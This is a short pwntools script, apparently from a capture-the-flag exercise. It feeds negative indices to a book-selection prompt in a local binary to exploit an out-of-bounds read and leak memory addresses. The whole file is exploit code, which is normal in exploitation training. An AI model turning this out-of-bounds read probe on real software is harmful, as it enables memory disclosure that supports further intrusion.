from pwn import *

binary = args.BIN
context.terminal = ["tmux", "splitw", "-v"]
e = context.binary = ELF(binary,checksec=False)

gs = '''
break *$rebase(0x12e0)
continue
'''
def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    else:
        return process(e.path)


def leak(index):
 addr = e.sym['books']+index*8
 with context.quiet:
  p = start()
  p.recvuntil(b'Which book would you like to read [0-3]')
  p.sendline(b"%i" %index)
  p.recvuntil(b'>>> This book: ')
  leak = u64(p.recvuntil(b' ').strip(b' ').ljust(8,b'\x00'))
  print("Leak at index: %i (0x%x), 0x%x" %(index,addr,leak))
  p.interactive()

#leak(-9)
#leak(-3)

for i in range(0,-10,-1):
 try:
  leak(i)
 except:
  pass
